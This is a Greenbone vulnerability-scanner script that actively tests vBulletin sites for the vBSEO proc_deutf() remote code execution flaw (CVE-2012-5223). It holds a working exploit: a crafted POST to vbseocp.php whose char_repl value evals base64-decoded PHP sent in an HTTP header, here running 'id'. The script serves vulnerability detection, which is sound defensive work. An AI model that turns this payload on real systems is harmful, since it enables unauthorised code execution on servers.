# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vbulletin:vbulletin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103405");
  script_cve_id("CVE-2012-5223");
  script_version("2025-05-29T05:40:25+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("vBSEO 'proc_deutf()' RCE Vulnerability - Active Check");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51647");
  script_xref(name:"URL", value:"http://www.vbseo.com/f5/vbseo-security-bulletin-all-supported-versions-patch-release-52783/");

  script_tag(name:"last_modification", value:"2025-05-29 05:40:25 +0000 (Thu, 29 May 2025)");
  script_tag(name:"creation_date", value:"2012-01-31 14:44:01 +0100 (Tue, 31 Jan 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("vbulletin_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vbulletin/http/detected");

  script_tag(name:"summary", value:"vBSEO is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this issue will allow attackers to execute arbitrary
  code within the context of the affected application.");

  script_tag(name:"affected", value:"vBSEO 3.5.0, 3.5.1, 3.5.2, and 3.6.0.are vulnerable, other
  versions may also be affected.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  details.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/vbseocp.php");

cmd = base64(str:'passthru("id");');
ex = "char_repl='{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}'=>";
len = strlen(ex);

host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Code: ", cmd, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", len, "\r\n",
             "\r\n",
             ex);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:result)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
